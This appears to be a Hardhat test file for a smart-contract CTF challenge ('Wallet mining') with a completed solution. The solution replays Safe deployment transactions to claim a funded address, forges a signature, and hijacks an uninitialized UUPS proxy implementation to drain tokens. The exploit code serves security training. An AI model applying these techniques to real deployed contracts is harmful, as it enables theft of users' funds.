const { ethers, upgrades, network } = require('hardhat');
const { expect } = require('chai');
const { parseUnits, defaultAbiCoder } = require('ethers/lib/utils');
const replay = require('./replay.json');
const factoryAbi = require('./factoryABI.json');
const gnosisAbi = require('./gnosisABI.json');

describe('[Challenge] Wallet mining', function () {
  let deployer, player;
  let token, authorizer, walletDeployer;
  let initialWalletDeployerTokenBalance;

  const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, ward, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

    // Deploy authorizer with the corresponding proxy
    authorizer = await upgrades.deployProxy(
      await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
      { kind: 'uups', initializer: 'init' }
    );

    expect(await authorizer.owner()).to.eq(deployer.address);
    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

    // Deploy Safe Deployer contract
    walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(token.address);
    expect(await walletDeployer.chief()).to.eq(deployer.address);
    expect(await walletDeployer.gem()).to.eq(token.address);

    // Set Authorizer in Safe Deployer
    await walletDeployer.rule(authorizer.address);
    expect(await walletDeployer.mom()).to.eq(authorizer.address);

    await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
    await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

    // Fund Safe Deployer with tokens
    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
    await token.transfer(walletDeployer.address, initialWalletDeployerTokenBalance);

    // Ensure these accounts start empty
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

    // Deposit large amount of DVT tokens to the deposit address
    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are set correctly
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).eq(initialWalletDeployerTokenBalance);
    expect(await token.balanceOf(player.address)).eq(0);
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    const replayDeployer = '0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a';
    await (await player.sendTransaction({ to: replayDeployer, value: parseUnits('0.9') })).wait();

    const gnosisAddr = (await (await ethers.provider.sendTransaction(replay.replayCopy)).wait()).contractAddress;
    await (await ethers.provider.sendTransaction(replay.replaySecondTx)).wait();
    const factoryAddr = (await (await ethers.provider.sendTransaction(replay.replayFactory)).wait()).contractAddress;

    const factory = await ethers.getContractAt(factoryAbi, factoryAddr, player);

    let addr = '';
    let i = 0;
    while (addr.toLowerCase() != DEPOSIT_ADDRESS.toLocaleLowerCase()) {
      addr = ethers.utils.getContractAddress({
        from: factory.address,
        nonce: i++,
      });
      await factory.connect(player).createProxy(gnosisAddr, '0x');
    }

    const gnosis = await ethers.getContractAt(gnosisAbi, DEPOSIT_ADDRESS);

    await gnosis
      .connect(player)
      .setup(
        [player.address],
        1,
        '0x0000000000000000000000000000000000000000',
        '0x',
        '0x0000000000000000000000000000000000000000',
        '0x0000000000000000000000000000000000000000',
        0,
        '0x0000000000000000000000000000000000000000'
      );

    const tokenCall = token.interface.encodeFunctionData('transfer', [player.address, DEPOSIT_TOKEN_AMOUNT]);
    const hash = await gnosis.getTransactionHash(
      token.address,
      0,
      tokenCall,
      0,
      0,
      0,
      0,
      '0x0000000000000000000000000000000000000000',
      '0x0000000000000000000000000000000000000000',
      0
    );

    const signature = ethers.BigNumber.from(await player.signMessage(ethers.utils.arrayify(hash)))
      .add(4)
      .toHexString();

    await gnosis.execTransaction(
      token.address,
      0,
      tokenCall,
      0,
      0,
      0,
      0,
      '0x0000000000000000000000000000000000000000',
      '0x0000000000000000000000000000000000000000',
      signature
    );

    const implStorage = await ethers.provider.getStorageAt(
      authorizer.address,
      '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
    );
    const implAddr = defaultAbiCoder.decode(['address'], implStorage)[0];
    const implContract = await ethers.getContractAt('AuthorizerUpgradeable', implAddr);
    await implContract.init([], []);

    const attackContract = await (await ethers.getContractFactory('AttackWalletMining', player)).deploy();
    await implContract.upgradeToAndCall(
      attackContract.address,
      attackContract.interface.encodeFunctionData('boom', [player.address])
    );

    const dropData = gnosis.interface.encodeFunctionData('setup', [
      [player.address],
      1,
      '0x0000000000000000000000000000000000000000',
      '0x',
      '0x0000000000000000000000000000000000000000',
      '0x0000000000000000000000000000000000000000',
      0,
      '0x0000000000000000000000000000000000000000',
    ]);
    for (i = 0; i < 43; i++) {
      await walletDeployer.connect(player).drop(dropData);
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Factory account must have code
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.not.eq('0x');

    // Master copy account must have code
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.not.eq('0x');

    // Deposit account must have code
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq('0x');

    // The deposit address and the Safe Deployer contract must not hold tokens
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
  });
});
